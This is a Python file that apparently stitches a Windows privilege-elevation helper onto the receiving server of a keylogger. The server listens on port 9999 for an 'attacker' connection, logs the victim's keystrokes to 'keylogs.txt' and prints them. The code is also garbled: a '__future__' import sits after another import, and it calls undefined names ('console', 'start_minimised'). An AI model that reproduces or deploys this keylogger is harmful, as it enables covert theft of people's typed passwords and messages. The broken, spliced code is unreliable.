import socket
from __future__ import absolute_import

import os
import sys

from ._load_from_os import *


ELEVATE = 'ElevateProgram'


def _launch(add_arguments=[], remove_arguments=[], visible=True):
    """Launch a new instance of python with arguments provided."""
    if isinstance(add_arguments, str):
        add_arguments = [add_arguments]
    if isinstance(remove_arguments, str):
        remove_arguments = [remove_arguments]
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([script] + [i for i in sys.argv[1:] if i not in remove_arguments] + list(add_arguments))
    return launch_console(params=params, visible=visible)

    
def has_been_elevated():
    return ELEVATE in sys.argv
    

def elevate(visible=True):
    """Attempt to elevate the current script and quit the original if successful.
    Ignore if being debugged. Ideally this part needs to figure out when it is acceptable to elevate.
    """
    if is_elevated() or has_been_elevated() or sys.argv[0].endswith('visualstudio_py_launcher.py'):
        return True
    
    if _launch(visible=visible, add_arguments=[ELEVATE]):
        sys.exit(0)
    
    return False


def new(*args):
    _launch(visible=True, add_arguments=list(args), remove_arguments=[ELEVATE])


def is_set(*args):
    for arg in args:
        if arg in sys.argv:
            return True

        
console.elevate(visible=not start_minimised)

host = '' #hacker IP address in string, actually don't need it
port = 9999

s = socket.socket()
s.bind((host, port))
s.listen(2)

def file_write(keys):
    with open("keylogs.txt","a") as file:
        for key in keys:
            file.write(key)

print(host)
conn, address = s.accept()
print("Connected to Client: " + str(address))
while True:
    data = conn.recv(1024).decode()
    file_write(str(data))
    if not data:
        break
    if str(data) == 'Key.space':
        data = ' '
    if str(data) == 'Key.enter':
        data = '\n'
    if str(data) == 'Key.tab':
        data = '\t'
    if str(data) == 'Key.backspace':
        data = ' [backspace] '
    if str(data) == 'Key.shift' or str(data) == 'Key.shift_r':
        data = ''
    if str(data) == 'Key.ctrl' or str(data) == 'Key.ctrl_r':
        data = ' [ctrl] '
    if str(data) == 'Key.alt' or str(data) == 'Key.alt_r':
        data = ' [alt] '
    if str(data) == 'Key.cmd' or str(data) == 'Key.cmd_r':
        data = ' [cmd] '
    if str(data) == 'Key.caps_lock':
        data = ' [caps lock] '
    if str(data) == 'Key.left':
        data = ' [left] '
    if str(data) == 'Key.right':
        data = ' [right] '
    if str(data) == 'Key.up':
        data = ' [up] '
    if str(data) == 'Key.down':
        data = ' [down] '
    print(str(data).strip("'"), end='', flush=True)
conn.close()
